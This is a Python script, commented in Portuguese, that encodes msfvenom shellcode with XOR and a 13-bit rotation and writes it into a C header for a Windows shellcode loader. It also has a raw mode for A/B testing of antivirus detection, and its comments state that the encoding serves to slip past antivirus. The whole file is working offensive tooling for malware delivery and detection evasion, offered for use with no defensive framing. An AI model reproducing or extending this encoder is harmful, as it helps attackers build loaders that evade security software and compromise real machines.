#!/usr/bin/env python3
"""
encode.py - Encoder de shellcode XOR + ROR13 para o loader

Pipeline:
    1. msfvenom gera shellcode + shikata_ga_nai (SGN)
    2. Este script aplica XOR + ROR13 sobre o output do SGN
    3. Gera shellcode.h com o array C pronto para compilar

Encoding:
    encoded_dword = ROR32(original_dword ^ key, 13)

O loader faz o inverso:
    original_dword = ROL32(encoded_dword, 13) ^ key

Uso:
    # Direto do msfvenom (raw binary):
    python encode.py --input shellcode.bin --key 0xDEADBEEF --output ../src/shellcode.h

    # De um array C (formato -f c do msfvenom):
    python encode.py --input shellcode.c --format c --output ../src/shellcode.h

    # De hex string:
    python encode.py --input shellcode.txt --format hex --output ../src/shellcode.h
"""

import argparse
import re
import sys

XOR_KEY_DEFAULT = 0xDEADBEEF


def ror32(value: int, shift: int) -> int:
    """Rotate Right de 32 bits."""
    shift &= 31
    return ((value >> shift) | (value << (32 - shift))) & 0xFFFFFFFF


def rol32(value: int, shift: int) -> int:
    """Rotate Left de 32 bits."""
    shift &= 31
    return ((value << shift) | (value >> (32 - shift))) & 0xFFFFFFFF


def encode_dword(dword: int, key: int) -> int:
    """encoded = ROR32(dword ^ key, 13)"""
    return ror32(dword ^ key, 13)


def decode_dword(dword: int, key: int) -> int:
    """Verificacao: decoded = ROL32(encoded, 13) ^ key"""
    return rol32(dword, 13) ^ key


def parse_c_array(text: str) -> bytes:
    """Extrai bytes de um array C no formato '\\xAA\\xBB...'"""
    # Encontra todos os \xHH
    hex_bytes = re.findall(r'\\x([0-9A-Fa-f]{2})', text)
    if not hex_bytes:
        # Tenta formato "0xAA, 0xBB"
        hex_bytes = re.findall(r'0x([0-9A-Fa-f]{2})', text)
    return bytes(int(h, 16) for h in hex_bytes)


def parse_hex_string(text: str) -> bytes:
    """Extrai bytes de uma string hex continua ou separada."""
    cleaned = re.sub(r'[^0-9A-Fa-f]', '', text)
    if len(cleaned) % 2 != 0:
        cleaned = cleaned[:-1]
    return bytes.fromhex(cleaned)


def parse_input(path: str, fmt: str) -> bytes:
    """Le e interpreta o input conforme o formato."""
    if fmt == "binary":
        with open(path, "rb") as f:
            return f.read()

    with open(path, "r", errors="ignore") as f:
        text = f.read()

    if fmt == "c":
        return parse_c_array(text)
    elif fmt == "hex":
        return parse_hex_string(text)
    else:
        raise ValueError(f"Formato desconhecido: {fmt}")


def pad_to_dword(data: bytes) -> bytes:
    """Padding com NOPs ate alinhar em 4 bytes."""
    while len(data) % 4 != 0:
        data += b'\x90'
    return data


def encode_shellcode(shellcode: bytes, key: int) -> bytes:
    """Aplica XOR + ROR13 em cada DWORD."""
    shellcode = pad_to_dword(shellcode)
    out = bytearray()

    for i in range(0, len(shellcode), 4):
        dword = int.from_bytes(shellcode[i:i + 4], "little")
        enc = encode_dword(dword, key)
        out += enc.to_bytes(4, "little")

    return bytes(out)


def verify(shellcode: bytes, encoded: bytes, key: int) -> bool:
    """Verifica que a decodificacao recupera o shellcode original (com padding)."""
    rec = bytearray()
    for i in range(0, len(encoded), 4):
        dword = int.from_bytes(encoded[i:i + 4], "little")
        dec = decode_dword(dword, key)
        rec += dec.to_bytes(4, "little")

    padded = pad_to_dword(shellcode)
    return bytes(rec) == padded


def generate_header(shellcode: bytes, encoded: bytes, key: int) -> str:
    """Gera o arquivo shellcode.h."""
    lines = []
    lines.append("/*")
    lines.append(" * shellcode.h - Gerado automaticamente por encode.py")
    lines.append(" *")
    lines.append(" * Encoding: XOR + ROR13")
    lines.append(f" * Chave XOR: 0x{key:08X}")
    lines.append(f" * Tamanho original: {len(shellcode)} bytes")
    lines.append(f" * Tamanho encoded:  {len(encoded)} bytes")
    lines.append(" */")
    lines.append("")
    lines.append("#pragma once")
    lines.append("#include <windows.h>")
    lines.append("")
    lines.append("#ifndef XOR_KEY_DEFAULT")
    lines.append(f"#define XOR_KEY_DEFAULT 0x{key:08X}")
    lines.append("#endif")
    lines.append("")
    lines.append(f"static BYTE g_encoded_shellcode[] = {{")

    # 16 bytes por linha
    for i in range(0, len(encoded), 16):
        chunk = encoded[i:i + 16]
        hex_bytes = ", ".join(f"0x{b:02X}" for b in chunk)
        lines.append(f"    {hex_bytes},")

    lines.append("};")
    lines.append("")

    return "\n".join(lines)


def generate_raw_header(shellcode: bytes) -> str:
    """
    Gera shellcode.h SEM codificacao (apenas para teste A/B de deteccao).

    Uso: python encode.py --raw ... --output src/shellcode.h
    ATENCAO: este arquivo contem payload raw e sera detectado por AV.
    """
    padded = pad_to_dword(shellcode)
    lines = []
    lines.append("/*")
    lines.append(" * shellcode.h - MODO RAW (SEM CODIFICACAO) - uso para teste A/B")
    lines.append(" *")
    lines.append(f" * ATENCAO: payload bruto - AV ira detectar.")
    lines.append(f" * Tamanho: {len(padded)} bytes")
    lines.append(" */")
    lines.append("")
    lines.append("#pragma once")
    lines.append("#include <windows.h>")
    lines.append("")
    lines.append("#ifndef XOR_KEY_DEFAULT")
    lines.append("#define XOR_KEY_DEFAULT 0x00000000")
    lines.append("#endif")
    lines.append("")
    lines.append("static BYTE g_encoded_shellcode[] = {")
    for i in range(0, len(padded), 16):
        chunk = padded[i:i + 16]
        hex_bytes = ", ".join(f"0x{b:02X}" for b in chunk)
        lines.append(f"    {hex_bytes},")
    lines.append("};")
    lines.append("")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Encoder XOR+ROR13 de shellcode para o loader",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--input", "-i", required=True,
                        help="Arquivo de entrada (shellcode)")
    parser.add_argument("--output", "-o", default="shellcode.h",
                        help="Arquivo de saida (default: shellcode.h)")
    parser.add_argument("--key", "-k", type=lambda x: int(x, 0),
                        default=XOR_KEY_DEFAULT,
                        help=f"Chave XOR (default: 0x{XOR_KEY_DEFAULT:08X})")
    parser.add_argument("--format", "-f",
                        choices=["binary", "c", "hex"],
                        default="binary",
                        help="Formato do input (default: binary)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Pula a verificacao de round-trip")
    parser.add_argument("--raw", action="store_true",
                        help="MODO RAW: nao codifica (apenas teste A/B de deteccao)")

    args = parser.parse_args()

    print(f"[*] Lendo input: {args.input} (formato: {args.format})")
    try:
        shellcode = parse_input(args.input, args.format)
    except Exception as e:
        print(f"[-] Erro ao ler input: {e}")
        sys.exit(1)

    if not shellcode:
        print("[-] Shellcode vazio!")
        sys.exit(1)

    print(f"[+] Shellcode carregado: {len(shellcode)} bytes")

    if args.raw:
        print("[!] MODO RAW: payload sera gravado SEM codificacao")
        print("[!] AV provavelmente detectara este arquivo")
        header = generate_raw_header(shellcode)
        with open(args.output, "w") as f:
            f.write(header)
        print(f"[+] Header raw gerado: {args.output}")
        sys.exit(0)

    print(f"[*] Chave XOR: 0x{args.key:08X}")

    encoded = encode_shellcode(shellcode, args.key)
    print(f"[+] Shellcode encoded: {len(encoded)} bytes")

    if not args.no_verify:
        if verify(shellcode, encoded, args.key):
            print("[+] Verificacao round-trip: OK")
        else:
            print("[-] Verificacao round-trip FALHOU!")
            sys.exit(1)

    header = generate_header(shellcode, encoded, args.key)
    with open(args.output, "w") as f:
        f.write(header)

    print(f"[+] Header gerado: {args.output}")
    print(f"[*] Compile o loader com shellcode.h no diretorio src/")


if __name__ == "__main__":
    main()
